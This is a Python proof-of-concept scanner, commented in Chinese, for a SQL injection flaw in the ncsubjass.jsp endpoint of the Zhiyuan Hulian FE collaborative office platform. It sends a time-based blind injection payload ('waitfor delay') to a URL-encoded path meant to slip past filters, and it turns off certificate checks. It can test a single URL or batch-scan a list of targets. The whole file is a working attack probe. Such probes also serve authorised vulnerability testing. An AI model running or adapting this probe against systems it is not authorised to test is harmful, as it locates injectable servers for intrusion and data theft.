#!/usr/bin/env python
# -*- coding: utf-8 -*-
import http.client
import ssl
import argparse
from urllib.parse import urlparse
import time

RED = '\033[91m'
RESET = '\033[0m'

def check_vulnerability(url):
    try:
        # 解析URL以获取域名和协议
        parsed_url = urlparse(url)
        # 指定请求的路径和数据体
        path = "/fenc/ncsubjass.j%73p"
        
        # 构造POST请求的数据体
        body = "subjcode=-1';waitfor delay '0:0:3'--"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0"
        }
        
        conn = None
        # 判断是http还是https，如果是https，则忽略证书验证
        if parsed_url.scheme == "https":
            conn = http.client.HTTPSConnection(parsed_url.netloc, context=ssl._create_unverified_context())
        else:
            conn = http.client.HTTPConnection(parsed_url.netloc)

        start_time = time.time()
        # 发送POST请求
        conn.request("POST", path, body=body, headers=headers)
        
        # 获取响应
        response = conn.getresponse()
        
        elapsed_time = time.time() - start_time
        
        if 3 <= elapsed_time <= 5:
            print(f"{RED}URL [{url}] 可能存在致远互联FE协作办公平台 ncsubjass SQL注入漏洞{RESET}")
        else:
            print(f"URL [{url}] 不存在漏洞")
    except Exception as e:
        print(f"URL [{url}] 请求失败: {e}")

def main():
    parser = argparse.ArgumentParser(description='检测目标地址是否存在致远互联FE协作办公平台 ncsubjass SQL注入漏洞')
    parser.add_argument('-u', '--url', help='指定目标地址')
    parser.add_argument('-f', '--file', help='指定包含目标地址的文本文件')

    args = parser.parse_args()

    if args.url:
        if not args.url.startswith("http://") and not args.url.startswith("https://"):
            args.url = "http://" + args.url
        check_vulnerability(args.url)
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "http://" + url
                check_vulnerability(url)

if __name__ == '__main__':
    main()